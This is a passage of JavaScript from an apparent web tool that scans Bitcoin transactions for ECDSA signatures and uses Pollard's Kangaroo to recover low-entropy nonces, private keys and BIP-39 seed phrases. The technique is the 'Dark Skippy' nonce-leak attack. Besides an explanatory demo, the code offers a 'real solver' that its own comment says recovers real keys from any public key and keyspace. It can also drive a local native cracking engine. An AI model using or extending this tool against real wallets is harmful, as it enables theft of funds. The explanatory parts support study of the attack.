        return '<div class="ds-kv"><span class="ds-k">' + label + '</span>' +
            '<code class="ds-v ' + (extraCls || '') + '">' + escapeHtml(val || '—') + '</code>' + copyBtn(val) + '</div>';
    }

    // Delegated copy handler (attached once for the whole page)
    function fallbackCopy(text, done) {
        try {
            const ta = document.createElement('textarea');
            ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
            document.body.appendChild(ta); ta.select();
            document.execCommand('copy'); document.body.removeChild(ta);
            done();
        } catch (e) { /* ignore */ }
    }
    document.addEventListener('click', function (ev) {
        const btn = ev.target && ev.target.closest ? ev.target.closest('.rsz-copy[data-copy]') : null;
        if (!btn) return;
        const val = btn.getAttribute('data-copy');
        const done = function () { btn.classList.add('copied'); setTimeout(function () { btn.classList.remove('copied'); }, 1200); };
        if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(val).then(done).catch(function () { fallbackCopy(val, done); });
        } else { fallbackCopy(val, done); }
    });

    // ---- Scan result rendering (mirrors the site's .keys-table look) -----
    function renderResults(rsz, input, mode, bits) {
        if (!rsz || rsz.length === 0) {
            return '<div class="rsz-status rsz-empty">No ECDSA signatures found for this ' +
                (mode === 'address' ? 'address' : 'transaction') + '.</div>';
        }

        const groups = groupByPub(rsz);

        let html = '';

        // Kangaroo verdict — filled asynchronously once the Worker finishes.
        html += '<div id="ds-box" class="rsz-leak-box rsz-leak-pending">';
        html += '<div class="rsz-status">' + spinner(14) + ' Hopping the 2<sup>' + bits + '</sup> nonce range across ' +
            groups.length + ' signer' + (groups.length > 1 ? 's' : '') + ' (Pollard&rsquo;s Kangaroo)…</div>';
        html += '</div>';

        // Summary chips
        html += '<div class="rsz-summary">';
        html += '<span class="rsz-chip">' + rsz.length + ' signature' + (rsz.length > 1 ? 's' : '') + '</span>';
        html += '<span class="rsz-chip">' + groups.length + ' signer' + (groups.length > 1 ? 's' : '') + '</span>';
        html += '<span class="rsz-chip">range 2<sup>' + bits + '</sup></span>';
        html += '</div>';

        // Column header
        html += '<div class="rsz-thead">';
        html += '<div><img src="../assets/svgs/solid/hashtag.svg" width="13" height="13" alt=""> Transaction ID</div>';
        html += '<div><img src="../assets/svgs/solid/key.svg" width="13" height="13" alt=""> R · S · Z</div>';
        html += '<div><img src="../assets/svgs/solid/wallet.svg" width="13" height="13" alt=""> Address · Public Key</div>';
        html += '</div>';

        // Rows — tagged with the signing pubkey so a cracked signer's rows can be
        // highlighted, each with an (initially empty) per-row slot for the
        // recovered nonce K.
        for (let idx = 0; idx < rsz.length; idx++) {
            const e = rsz[idx];
            const txid = e.txid || (mode === 'txid' ? input.toLowerCase() : '');
            html += '<div class="rsz-row" id="rsz-row-' + idx + '" data-pub="' + escapeHtml(e.pub || '') +
                '" data-sig="' + escapeHtml((e.r || '') + '|' + (e.s || '') + '|' + (e.z || '')) + '">';

            html += '<div class="rsz-col rsz-col-txid"><span class="key-label">TXID</span>' +
                monoCell(txid, 'rsz-txid') + '</div>';

            html += '<div class="rsz-col rsz-col-rsz">' +
                rszLine('R', e.r) + rszLine('S', e.s) + rszLine('Z', e.z) + '</div>';

            html += '<div class="rsz-col rsz-col-addr">' +
                addrLine('ADDR', e.addr) + addrLine('PUB', e.pub) + '</div>';

            html += '<div class="rsz-leak-detail" id="rsz-leak-' + idx + '"></div>';

            html += '</div>';
        }

        return html;
    }

    // Render one reconstructed-seed block (shared by scan + demo).
    function seedBlock(secretHex, secretBits, mnemonic) {
        let h = '';
        h += '<div class="ds-kv"><span class="ds-k">Secret</span>' +
            '<code class="ds-v ds-secret">' + escapeHtml(secretHex) + '</code>' + copyBtn(secretHex) + '</div>';
        h += '<div class="ds-hops">Reconstructed ' + secretBits + '-bit master secret (high half &#8214; low half).</div>';
        if (mnemonic) {
            h += '<div class="ds-mnemonic">' + escapeHtml(mnemonic) + copyBtn(mnemonic) + '</div>';
        }
        return h;
    }

    // Fill #ds-box after the scan Worker returns. `res` = {groups, results, …}.
    // `words` is the (optionally loaded) BIP-39 wordlist for seed → mnemonic.
    function renderScan(res, bits, words) {
        const results = res ? res.results : null;
        if (results === null) {
            const why = res && res.error ? (' (' + escapeHtml(res.error) + ')') : '';
            return '<div class="rsz-leak-note"><img src="../assets/svgs/solid/triangle-exclamation.svg" width="14" height="14" alt=""> ' +
                'Could not run the recovery engine in this browser (Web Worker unavailable)' + why +
                '. The R &middot; S &middot; Z values are shown below.</div>';
        }
        if (!results.length) {
            return '<div class="rsz-leak-note">No signer with a usable public key here, so there is nothing to hop. ' +
                'The R &middot; S &middot; Z values are listed below.</div>';
        }

        const found = results.filter(function (r) { return r.found; });
        let html = '';

        html += '<div class="rsz-summary">';
        html += '<span class="rsz-chip">' + results.length + ' signer' + (results.length > 1 ? 's' : '') + ' tested</span>';
        html += '<span class="rsz-chip">searched 2<sup>' + bits + '</sup> / nonce</span>';
        if (typeof res.steps === 'number') html += '<span class="rsz-chip">' + res.steps.toLocaleString() + ' hops</span>';
        if (found.length) html += '<span class="rsz-chip rsz-chip-danger">Low-entropy nonce &middot; ' + found.length + ' key' + (found.length > 1 ? 's' : '') + ' recovered</span>';
        else html += '<span class="rsz-chip rsz-chip-ok">No low-entropy nonce detected</span>';
        html += '</div>';

        if (found.length) {
            found.forEach(function (r) {
                html += '<div class="rsz-vuln-box">';
                html += '<div class="rsz-vuln-title"><img src="../assets/svgs/solid/triangle-exclamation.svg" width="15" height="15" alt=""> ' +
                    'LOW-ENTROPY NONCE (DARK SKIPPY) — ' + r.hits.length + ' of ' + r.count +
                    ' signature' + (r.count > 1 ? 's' : '') + ' below 2<sup>' + bits + '</sup></div>';
                html += '<div class="rsz-vuln-key"><span class="key-label">Signer</span>' +
                    '<code class="rsz-val rsz-addr-val">' + escapeHtml(r.addr || '—') + '</code>' + copyBtn(r.addr) + '</div>';
                html += '<div class="rsz-vuln-key"><span class="key-label">Private key</span>' +
                    '<span class="private-key">' + escapeHtml(r.priv) + '</span>' + copyBtn(r.priv) + '</div>';
                r.hits.forEach(function (h, hi) {
                    const kHex = '0x' + h.k;
                    html += '<div class="ds-kv"><span class="ds-k">Nonce ' + (hi + 1) + '</span>' +
                        '<code class="ds-v rsz-nonce">' + escapeHtml(kHex) + '</code>' + copyBtn(kHex) + '</div>';
                });
                if (r.seed) {
                    const mnem = entropyToMnemonic(r.seed.secretHex, words);
                    html += seedBlock('0x' + r.seed.secretHex, r.seed.secretBits, mnem);
                }
                if (r.capped) {
                    html += '<div class="rsz-leak-bits">Signer has ' + r.capped +
                        ' signatures; the Kangaroo sweep started from the first 6.</div>';
                }
                html += '</div>';
            });
        } else {
            const exhausted = res.exhausted ? ' The search budget was reached first — raise the range only if you expect a genuinely small nonce.' : '';
            html += '<div class="rsz-leak-note rsz-leak-ok">Hopped up to 2<sup>' + bits + '</sup> per nonce across ' +
                results.length + ' signer' + (results.length > 1 ? 's' : '') +
                ' — no low-entropy (Dark Skippy) nonce. These signatures look safe.' + exhausted +
                ' A real Dark Skippy leak hides 64-bit halves, out of reach of an in-browser search — use the live recovery to see the mechanism.</div>';
        }

        return html;
    }

    // Fill each cracked signer's matching rows with the recovered nonce K.
    function annotateRows(rsz, results) {
        if (!results || !results.length) return;
        const hitKey = {};   // "pub|r|s|z" -> kHex
        results.forEach(function (r) {
            if (!r.found) return;
            r.hits.forEach(function (h) { hitKey[r.pub + '|' + h.r + '|' + h.s + '|' + h.z] = h.k; });
        });

        for (let idx = 0; idx < rsz.length; idx++) {
            const e = rsz[idx];
            const k = hitKey[e.pub + '|' + e.r + '|' + e.s + '|' + e.z];
            const row = document.getElementById('rsz-row-' + idx);
            const box = document.getElementById('rsz-leak-' + idx);
            if (k === undefined || !row || !box) continue;

            const kHex = '0x' + k;
            row.classList.add('rsz-row-vuln');
            box.innerHTML = '<div class="rsz-leak-badge">nonce recovered</div>' +
                '<div class="rsz-line"><span class="rsz-tag">K</span>' +
                '<code class="rsz-val rsz-nonce">' + escapeHtml(kHex) + '</code>' + copyBtn(kHex) + '</div>';
        }
    }

    // ---- Live-recovery rendering -----------------------------------------
    function renderDemo(demo, mnemonic) {
        if (!demo) {
            return '<div class="rsz-leak-note"><img src="../assets/svgs/solid/triangle-exclamation.svg" width="14" height="14" alt=""> ' +
                'Could not run the live recovery (Web Worker unavailable in this browser).</div>';
        }
        if (demo.error) {
            return '<div class="rsz-error"><img src="../assets/svgs/solid/triangle-exclamation.svg" width="14" height="14" alt=""> ' +
                'Recovery error: ' + escapeHtml(demo.error) + '</div>';
        }

        const v = demo.victim, rc = demo.recovered;
        const addr = (function () { try { return pubToAddr_P2PKH(v.cpub); } catch (e) { return null; } })();
        let html = '';

        // Summary chips
        html += '<div class="rsz-summary">';
        html += '<span class="rsz-chip">range 2<sup>' + demo.bits + '</sup> / half</span>';
        html += '<span class="rsz-chip">&#8730;range ≈ ' + Number(demo.sqrt).toLocaleString() + '</span>';
        html += '<span class="rsz-chip">' + demo.steps.toLocaleString() + ' hops</span>';
        html += '<span class="rsz-chip ' + (demo.match ? 'rsz-chip-danger' : 'rsz-chip-ok') + '">' +
            (demo.match ? 'Seed recovered' : 'Not recovered') + '</span>';
        html += '</div>';

        // Success / failure banner
        if (demo.match) {
            html += '<div class="ds-success"><img src="../assets/svgs/solid/triangle-exclamation.svg" width="16" height="16" alt=""> ' +
                'Pollard&rsquo;s Kangaroo recovered <span class="ds-match">both nonce halves, the signing key, and the full master secret</span> from just the two on-chain signatures.</div>';
        } else {
            html += '<div class="ds-success ds-fail"><img src="../assets/svgs/solid/triangle-exclamation.svg" width="16" height="16" alt=""> ' +
                '<span class="ds-nomatch">Not fully recovered within the hop budget.</span> Lower the range (bits) and run again.</div>';
        }

        // Victim panel — what a malicious signer buried + published on-chain
        html += '<div class="ds-panel ds-victim">';
        html += '<div class="ds-panel-title"><img src="../assets/svgs/solid/bug.svg" width="14" height="14" alt=""> Malicious signer (the victim)</div>';
        html += kvRow('Secret', '0x' + v.secretHex, 'ds-secret');
        html += kvRow('Half 1', '0x' + v.h1Hex);
        html += kvRow('Half 2', '0x' + v.h2Hex);
        html += kvRow('Signing key', v.privHex);
        html += kvRow('Public key', v.cpub);
        if (addr) html += kvRow('Address', addr);
        v.sigs.forEach(function (sg, i) {
            html += '<div class="ds-sig">';
            html += '<div class="ds-hops">Signature ' + (i + 1) + ' — nonce k = 0x' + escapeHtml(sg.kHex) + ' (buried seed half)</div>';
            html += kvRow('R', sg.rHex);
            html += kvRow('S', sg.sHex);
            html += kvRow('Z', sg.zHex);
            html += '</div>';
        });
        html += '</div>';

        // Recovered panel — what the attacker extracts from only R,S,Z + pubkey
        html += '<div class="ds-panel ds-recovered">';
        html += '<div class="ds-panel-title"><img src="../assets/svgs/solid/key.svg" width="14" height="14" alt=""> Recovered by Kangaroo (attacker)</div>';
        html += kvRow('Nonce 1', rc.k1Hex ? '0x' + rc.k1Hex : null, 'rsz-nonce') +
            (rc.k1Hex === v.h1Hex ? '<span class="ds-match ds-hops">matches half 1 ✓</span>' : '');
        html += kvRow('Nonce 2', rc.k2Hex ? '0x' + rc.k2Hex : null, 'rsz-nonce') +
            (rc.k2Hex === v.h2Hex ? '<span class="ds-match ds-hops">matches half 2 ✓</span>' : '');
        html += '<div class="rsz-vuln-key" style="margin-top:.35rem"><span class="ds-k">Signing key</span>' +
            '<span class="private-key">' + escapeHtml(rc.privHex || '—') + '</span>' + copyBtn(rc.privHex) +
            (rc.privHex === v.privHex ? '<span class="ds-match ds-hops">matches ✓</span>' : '') + '</div>';
        if (rc.secretHex) {
            html += seedBlock('0x' + rc.secretHex, rc.secretBits, mnemonic);
            html += (rc.secretHex === v.secretHex ? '<div class="ds-match ds-hops">reconstructed secret matches the victim ✓</div>' : '');
        }
        html += '</div>';

        // Honesty note about the real-world scale
        html += '<div class="rsz-leak-note">This live recovery cracks two ' + demo.bits + '-bit halves in your browser to prove the mechanism. ' +
            'The real Dark Skippy attack buries two <strong>64-bit</strong> halves (a 128-bit / 12-word seed); the maths is identical, ' +
            'but a 2<sup>64</sup> search needs the attacker&rsquo;s optimised, offline Kangaroo rather than a web page.</div>';

        return html;
    }

    // ---- live real-time speed panel -------------------------------------
    function fmtRate(r) {
        if (!isFinite(r) || r <= 0) return '0';
        var u = ['', 'K', 'M', 'G', 'T', 'P'], i = 0;
        while (r >= 1000 && i < u.length - 1) { r /= 1000; i++; }
        return (r >= 100 ? r.toFixed(0) : r >= 10 ? r.toFixed(1) : r.toFixed(2)) + (u[i] ? ' ' + u[i] : '');
    }
    function fmtInt(n) {
        if (typeof n === 'string') return n;
        try { return Math.round(n).toLocaleString('en-US'); } catch (e) { return String(Math.round(n || 0)); }
    }
    function fmtDur(s) {
        if (!isFinite(s) || s < 0) s = 0;
        if (s < 60) return s.toFixed(1) + 's';
        var m = Math.floor(s / 60), ss = Math.floor(s % 60);
        if (m < 60) return m + 'm ' + (ss < 10 ? '0' : '') + ss + 's';
        var h = Math.floor(m / 60); return h + 'h ' + (m % 60) + 'm';
    }

    // The native DLL runs so fast that it often solves a keyspace before printing
    // even one live "[N TeraKeys/s]" line — leaving the panel at a misleading
    // "0 keys/s / 0 hops" that makes the fastest engine look broken. When that
    // happens we show the *effective* Kangaroo throughput instead: it collapses a
    // discrete-log over a keyspace of `width` in `elapsed`s, so width/elapsed is
    // the honest "keyspace searched per second" (and ~2·√width is the hop count).
    // Returns null-ish fields when it can't compute, so callers can keep any real
    // DLL numbers they already have.
    function nativeEff(startHex, endHex, elapsedSec) {
        try {
            var lo = BigInt('0x' + (startHex || '1').replace(/^0x/i, ''));
            var hi = BigInt('0x' + (endHex || '1').replace(/^0x/i, ''));
            var width = hi - lo; if (width < 1n) width = 1n;
            var wn = Number(width);
            var el = (elapsedSec && elapsedSec > 0.05) ? elapsedSec : 0.05;
            var rate = (isFinite(wn) && wn > 0) ? wn / el : 0;
            var hops = (isFinite(wn) && wn > 0) ? Math.round(2 * Math.sqrt(wn)) : 0;
            return {
                rate: rate,
                rateText: rate > 0 ? (fmtRate(rate) + ' keys/s') : null,
                hopsText: hops > 0 ? hops.toLocaleString('en-US') : ''
            };
        } catch (e) { return { rate: 0, rateText: null, hopsText: '' }; }
    }

    // Find (or lazily create) the host element for the live panel, placed just
    // above the output card so it survives the output's innerHTML churn.
    function liveHost() {
        var h = document.getElementById('ds-live-host');
        if (h) return h;
        var out = document.getElementById('out_txid');
        if (!out || !out.parentNode) return null;
        h = document.createElement('div');
        h.id = 'ds-live-host';
        out.parentNode.insertBefore(h, out);
        return h;
    }

    // Real-time engine dashboard: speed (keys/s), total hops, elapsed, cores,
    // per-core activity bars and a progress bar. Built once into `host`; then
    // driven frame-by-frame via .set(). Values use textContent (no HTML injection).
    function LivePanel(host) {
        if (!host) return null;
        host.innerHTML =
            '<div class="ds-live ds-live-indet">' +
              '<div class="ds-live-head">' +
                '<span class="ds-live-dot"></span>' +
                '<span class="ds-live-title">Kangaroo engine</span>' +
                '<span class="ds-live-badge" data-el="engine">Browser</span>' +
                '<span class="ds-live-state" data-el="state">idle</span>' +
              '</div>' +
              '<div class="ds-live-ctx">' +
                '<div class="ds-live-ctx-row"><span class="ds-live-ctx-k">Public key</span><span class="ds-live-ctx-v" data-el="pub">&mdash;</span></div>' +
                '<div class="ds-live-ctx-row"><span class="ds-live-ctx-k">Start range</span><span class="ds-live-ctx-v" data-el="start">&mdash;</span></div>' +
                '<div class="ds-live-ctx-row"><span class="ds-live-ctx-k">End range</span><span class="ds-live-ctx-v" data-el="end">&mdash;</span></div>' +
                '<div class="ds-live-ctx-row ds-live-ctx-scan"><span class="ds-live-ctx-k">Working on</span><span class="ds-live-ctx-v" data-el="scan">&mdash;</span></div>' +
              '</div>' +
              '<div class="ds-live-speed"><span class="ds-live-num" data-el="rate">0</span> <span class="ds-live-unit" data-el="unit">keys/s</span></div>' +
              '<div class="ds-live-bar"><div class="ds-live-bar-fill" data-el="bar"></div></div>' +
              '<div class="ds-live-grid">' +
                '<div class="ds-live-stat"><span class="ds-live-k">Total hops</span><span class="ds-live-v" data-el="hops">0</span></div>' +
                '<div class="ds-live-stat"><span class="ds-live-k">Elapsed</span><span class="ds-live-v" data-el="elapsed">0.0s</span></div>' +
                '<div class="ds-live-stat"><span class="ds-live-k">Cores</span><span class="ds-live-v" data-el="cores">&mdash;</span></div>' +
                '<div class="ds-live-stat"><span class="ds-live-k">Avg rate</span><span class="ds-live-v" data-el="avg">0</span></div>' +
              '</div>' +
              '<div class="ds-live-cores" data-el="corebars"></div>' +
            '</div>';
        var q = function (n) { return host.querySelector('[data-el="' + n + '"]'); };
        var root = host.querySelector('.ds-live');
        var e = { engine: q('engine'), state: q('state'), rate: q('rate'), unit: q('unit'), bar: q('bar'), hops: q('hops'), elapsed: q('elapsed'), cores: q('cores'), avg: q('avg'), corebars: q('corebars'), pub: q('pub'), start: q('start'), end: q('end'), scan: q('scan') };
        var ema = 0, emaInit = false, coreEls = [];
        function ensureCoreBars(n) {
            if (coreEls.length === n) return;
            e.corebars.innerHTML = ''; coreEls = [];
            for (var i = 0; i < n; i++) {
                var c = document.createElement('span'); c.className = 'ds-live-core';
                var f = document.createElement('span'); f.className = 'ds-live-core-fill';
                c.appendChild(f); e.corebars.appendChild(c); coreEls.push(f);
            }
        }
        return {
            set: function (f) {
                if (!root || !f) return;
                var native = f.engine === 'native';
                root.classList.toggle('ds-live-native', native);
                e.engine.textContent = native ? 'Native · kgaroocgtegein' : ('Browser · ' + (f.cores || '?') + ' core' + ((f.cores || 0) > 1 ? 's' : ''));
                e.state.textContent = f.state || 'running';
                // Solve context — public key, keyspace and the sub-range being
                // hopped right now. Guarded so a bare speed frame never clears them.
                if (f.pub != null) e.pub.textContent = f.pub || '—';
                if (f.startHex != null) e.start.textContent = f.startHex ? ('0x' + f.startHex) : '—';
                if (f.endHex != null) e.end.textContent = f.endHex ? ('0x' + f.endHex) : '—';
                if (f.scanStart != null || f.scanEnd != null) {
                    e.scan.textContent = '0x' + (f.scanStart || '0') + '  :  0x' + (f.scanEnd || '0');
                }
                var rate = f.rate || 0;
                if (rate > 0) { if (!emaInit) { ema = rate; emaInit = true; } else ema = ema * 0.6 + rate * 0.4; }
                if (native) {
                    if (f.rateText) { e.rate.textContent = f.rateText; e.unit.textContent = ''; }
                    else if (rate > 0) { e.rate.textContent = fmtRate(rate); e.unit.textContent = 'keys/s'; }
                    else { e.rate.textContent = '—'; e.unit.textContent = ''; }
                } else { e.rate.textContent = fmtRate(emaInit ? ema : (f.rateAvg || 0)); e.unit.textContent = 'keys/s'; }
                e.hops.textContent = (f.hopsText != null && f.hopsText !== '') ? f.hopsText : (native ? '—' : fmtInt(f.hops || 0));
                e.elapsed.textContent = f.elapsedText || fmtDur(f.elapsed || 0);
                e.cores.textContent = f.cores || '—';
                e.avg.textContent = native ? (f.rateText || (rate > 0 ? fmtRate(rate) + ' keys/s' : '—')) : (fmtRate(f.rateAvg || 0) + ' keys/s');
                var pct = (typeof f.pct === 'number' && isFinite(f.pct)) ? f.pct : null;
                if (pct == null) { root.classList.add('ds-live-indet'); e.bar.style.width = ''; }
                else { root.classList.remove('ds-live-indet'); e.bar.style.width = Math.max(2, Math.min(99, pct)) + '%'; }
                if (!native && f.per && f.per.length) {
                    ensureCoreBars(f.per.length);
                    var mx = 1; for (var i = 0; i < f.per.length; i++) mx = Math.max(mx, f.per[i]);
                    for (var j = 0; j < coreEls.length; j++) coreEls[j].style.height = Math.max(8, Math.round((f.per[j] / mx) * 100)) + '%';
                } else if (native && coreEls.length) { e.corebars.innerHTML = ''; coreEls = []; }
            },
            done: function (ok, text) {
                if (!root) return;
                root.classList.remove('ds-live-indet');
                root.classList.add('ds-live-finished'); root.classList.toggle('ds-live-ok', !!ok);
                e.state.textContent = text || (ok ? 'found' : 'stopped');
                if (ok) e.bar.style.width = '100%';
            }
        };
    }

    // ---- engine selection + native status -------------------------------
    // Which engine the user ticked on the page: 'js' (default, in-browser
    // multi-core) or 'native' (kgaroocgtegein DLL via the local PC server).
    function readEngine() {
        var sel = document.getElementById('ds-engine');
        if (sel && sel.value) return sel.value;
        var r = document.querySelector('input[name="ds-engine"]:checked');
        if (r && r.value) return r.value;
        return 'js';
    }
    // Probe the native server and reflect it in the #ds-native-status badge.
    async function refreshNativeStatus() {
        var badge = document.getElementById('ds-native-status');
        var h = await Native.health(true);
        if (badge) {
            if (h) { badge.textContent = 'online · ' + (h.cores || '?') + ' cores'; badge.className = 'ds-native-badge ds-native-on'; }
            else if (Native.base()) { badge.textContent = 'offline — start server'; badge.className = 'ds-native-badge ds-native-off'; }
            else { badge.textContent = 'PC / localhost only'; badge.className = 'ds-native-badge ds-native-off'; }
        }
        // Expand the core list to the largest of the browser's logical cores and the
        // native server's core count, so a 32-core PC can pick up to 32. Default stays 4.
        try {
            var hw = (typeof navigator !== 'undefined' && navigator.hardwareConcurrency) ? navigator.hardwareConcurrency : 4;
            populateCoreOptions(Math.max(hw, (h && h.cores) ? h.cores : 0));
        } catch (e) { }
        return h;
    }

    // ---- real solver (pubkey + range -> private key) --------------------
    function bitLen(bi) { return bi > 0n ? bi.toString(2).length : 0; }
    function errBox(html) {
        return '<div class="rsz-error"><img src="../assets/svgs/solid/triangle-exclamation.svg" width="14" height="14" alt=""> ' + html + '</div>';
    }
    function addrFor(pub) { try { return (pub && pub.length === 66) ? pubToAddr_P2PKH(pub) : null; } catch (e) { return null; } }
    function solveIntro(ctx) {
        return '<div class="rsz-status">' + spinner(14) + ' ' +
            (ctx.engine === 'native' ? 'Native kgaroocgtegein engine' : 'Browser engine (' + kangarooCores() + ' cores)') +
            ' — hopping keyspace 0x' + escapeHtml(ctx.startHex) + ' : 0x' + escapeHtml(ctx.endHex) +
            ' (2<sup>' + ctx.bits + '</sup> wide)…</div>';
    }
    function nativeHintBox(s, e, pub) {
        return '<div class="ds-panel"><div class="ds-panel-title">Start the native engine (PC / laptop)</div>' +
            '<div class="ds-hops">1. Open a terminal in the <code>kgaroocgtegein/</code> folder.</div>' +
            '<div class="ds-hops">2. Run <code>python server.py</code> (needs Python 3 + <code>pip install bit</code>).</div>' +
            '<div class="ds-hops">3. It serves <code>http://127.0.0.1:3001</code> — reload this page, the badge turns green.</div>' +
            '<div class="ds-hops" style="margin-top:.4rem">Manual equivalent: <code>python kangaroo.py -p ' + escapeHtml(pub) + ' -keyspace ' + escapeHtml(s) + ':' + escapeHtml(e) + ' -ncore 4</code></div></div>';
    }
    function renderSolve(res, ctx, addr) {
        var engName = ((res.engine || ctx.engine) === 'native') ? 'Native · kgaroocgtegein' : ('Browser · ' + (res.__cores || kangarooCores()) + ' cores');
        var html = '<div class="rsz-summary">';
        html += '<span class="rsz-chip">' + escapeHtml(engName) + '</span>';
        html += '<span class="rsz-chip">range 2<sup>' + (ctx.bits || 0) + '</sup></span>';
        if (res.sqrt) html += '<span class="rsz-chip">&#8730;range ≈ ' + Number(res.sqrt).toLocaleString() + '</span>';
        if (typeof res.__hops === 'number' && res.__hops > 0) html += '<span class="rsz-chip">' + Math.round(res.__hops).toLocaleString() + ' hops</span>';
        if (typeof res.__elapsed === 'number') html += '<span class="rsz-chip">' + fmtDur(res.__elapsed) + '</span>';
        html += '<span class="rsz-chip ' + (res.ok ? 'rsz-chip-danger' : 'rsz-chip-ok') + '">' + (res.ok ? 'Key recovered' : 'Not found') + '</span></div>';

        if (res.ok && res.privHex) {
            html += '<div class="ds-success"><img src="../assets/svgs/solid/key.svg" width="16" height="16" alt=""> ' +
                'Kangaroo recovered the <span class="ds-match">private key</span> for this public key within the given keyspace.</div>';
            html += '<div class="ds-panel ds-recovered">';
            html += '<div class="ds-panel-title"><img src="../assets/svgs/solid/key.svg" width="14" height="14" alt=""> Recovered private key</div>';
            html += '<div class="rsz-vuln-key"><span class="ds-k">Private key</span><span class="private-key">0x' + escapeHtml(res.privHex) + '</span>' + copyBtn('0x' + res.privHex) + '</div>';
            try { html += kvRow('Decimal', BigInt('0x' + res.privHex).toString()); } catch (e) { }
            html += kvRow('Public key', ctx.pub || res.cpub || '—');
            if (addr) html += kvRow('Address', addr);
            html += kvRow('Keyspace', '0x' + ctx.startHex + ' : 0x' + ctx.endHex);
            html += '</div>';
        } else {
            html += '<div class="ds-success ds-fail"><img src="../assets/svgs/solid/triangle-exclamation.svg" width="16" height="16" alt=""> ' +
                '<span class="ds-nomatch">No key found' + (res.exhausted ? ' within the hop budget' : '') + '.</span> ' +
                'Make sure the private key lies inside the keyspace' + (((res.engine || ctx.engine) === 'native') ? '.' : ', narrow the range, or switch to the native engine.') + '</div>';
        }
        return html;
    }

    // Main entry: real-world Kangaroo solve. Reads the pubkey + keyspace and the
    // engine toggle, then runs the browser pool or the native DLL server, showing
    // real-time speed the whole time. NOT a demo — it recovers a real key.
    async function darkSkippySolve() {
        var out = document.getElementById('out_txid');
        if (!out) return;
        var header = getOutputHeader(out.id);
        setStats(null);

        var pub = (document.getElementById('ds-pub') ? document.getElementById('ds-pub').value : '').trim().toLowerCase().replace(/^0x/, '');
        var rangeRaw = (document.getElementById('ds-range') ? document.getElementById('ds-range').value : '').trim();
        var engine = readEngine();

        if (!(/^0[23][0-9a-f]{64}$/.test(pub) || /^04[0-9a-f]{128}$/.test(pub))) {
            out.innerHTML = header + errBox('Enter a valid public key — 66-hex compressed (02/03…) or 130-hex uncompressed (04…).'); return;
        }
        var parts = rangeRaw.replace(/\s+/g, '').split(':');
        if (parts.length !== 2 || !/^(0x)?[0-9a-f]+$/i.test(parts[0]) || !/^(0x)?[0-9a-f]+$/i.test(parts[1])) {
            out.innerHTML = header + errBox('Enter a keyspace as <code>start:end</code> in hex — e.g. <code>1:fffff</code> or <code>20000000000:3ffffffffff</code>.'); return;
        }
        var startHex = parts[0].replace(/^0x/i, ''), endHex = parts[1].replace(/^0x/i, '');
        var lo, hi;
        try { lo = BigInt('0x' + startHex); hi = BigInt('0x' + endHex); } catch (e) { out.innerHTML = header + errBox('Invalid hex in the keyspace range.'); return; }
        if (hi < lo) { var t = lo; lo = hi; hi = t; var th = startHex; startHex = endHex; endHex = th; }
        var bits = bitLen(hi - lo);
        var ctx = { engine: engine, startHex: startHex, endHex: endHex, bits: bits, pub: pub };

        var host = liveHost();
        var live = host ? LivePanel(host) : null;

        // In-browser engine ceiling — also the ceiling for the fallback when the
        // native engine is off, so picking "native" still recovers small keyspaces.
        var JSMAX = (cfg().kangarooJsMaxBits | 0) || 44;
        var fallbackNote = '';

        if (engine === 'native') {
            if (live) live.set({ engine: 'native', state: 'connecting…', cores: '—',
                pub: pub, startHex: startHex, endHex: endHex, scanStart: startHex, scanEnd: endHex });
            var h = await Native.health(true);
            if (h && h.ready !== false) {
                var ncore = nativeCoresFor(h.cores);
                ctx.cores = ncore;
                out.innerHTML = header + solveIntro(ctx);
                var nt0 = (typeof performance !== 'undefined' && performance.now) ? performance.now() : 0;
                var nSawSpeed = false;
                var nres = await Native.run(pub, startHex, endHex, ncore, function (fr) {
                    if (!live) return;
                    if (fr.speed != null) nSawSpeed = true;
                    var el = fr.elapsedSec || (nt0 ? (performance.now() - nt0) / 1000 : 0);
                    var eff = nativeEff(startHex, endHex, el);   // fills in when the DLL is too fast to print a speed line
                    live.set({
                        engine: 'native', state: fr.scanning ? 'scanning' : 'running',
                        rate: fr.keysPerSec || eff.rate,
                        rateText: (fr.speed != null ? (fr.speed + ' ' + (fr.unit || '') + '/s') : eff.rateText),
                        hopsText: fr.count || eff.hopsText, elapsedText: fr.elapsed || null, elapsed: el,
                        cores: fr.cores || ncore, pct: (typeof fr.pct === 'number' ? fr.pct : null),
                        scanStart: fr.scanStart, scanEnd: fr.scanEnd
                    });
                });
                // A genuine find, or a clean "searched, nothing there", is final. Only a
                // transport failure (offline mid-run / stream error / stalled with no
                // frames) drops through to the in-browser engine below.
                if (nres && !nres.error && (nres.ok === true || nres.ok === false)) {
                    var nok = !!(nres.ok && nres.privHex);
                    // Final panel refresh: an instant DLL find never streams a speed line,
                    // so paint the effective throughput + total elapsed here (not 0/0/—).
                    if (live) {
                        var elDone = nt0 ? (performance.now() - nt0) / 1000 : 0;
                        var effDone = nativeEff(startHex, endHex, elDone);
                        if (!nSawSpeed) live.set({ engine: 'native', state: nok ? 'FOUND' : 'not found',
                            rate: effDone.rate, rateText: effDone.rateText, hopsText: effDone.hopsText,
                            elapsed: elDone, cores: ncore, pct: nok ? 100 : null });
                        live.done(nok, nok ? 'FOUND' : 'not found');
                    }
                    out.innerHTML = header + renderSolve({ ok: nok, privHex: nok ? nres.privHex : null, engine: 'native', sqrt: null }, ctx, addrFor(pub));
                    return;
                }
                fallbackNote = 'The native engine stopped responding — finishing this solve on the in-browser engine.';
            } else {
                fallbackNote = 'The native kgaroocgtegein engine is <strong>offline</strong> — running the in-browser engine instead. For the full-speed DLL, run <code>python server.py</code> in the <code>kgaroocgtegein/</code> folder and reload.';
            }
            // Transparent fallback: re-point the live panel at the browser engine and
            // continue into the JS multi-core path — never leave a dead, frozen panel.
            engine = 'js'; ctx.engine = 'js';
            if (live) live.set({ engine: 'js', state: 'browser engine', cores: kangarooCores(),
                pub: pub, startHex: startHex, endHex: endHex, scanStart: startHex, scanEnd: endHex });
        }

        // Browser (JS multi-core) path — reached directly for the 'js' engine, or as
        // the transparent fallback when the native engine is offline/unavailable.
        if (bits > JSMAX) {
            out.innerHTML = header +
                (fallbackNote ? '<div class="rsz-leak-note">' + fallbackNote + '</div>' : '') +
                '<div class="rsz-leak-note"><img src="../assets/svgs/solid/triangle-exclamation.svg" width="14" height="14" alt=""> This keyspace is 2<sup>' + bits +
                '</sup> wide — beyond the in-browser engine (limit 2<sup>' + JSMAX + '</sup>). Tick <strong>kgaroocgtegein (native)</strong> and run the local server for the full-speed DLL.</div>' +
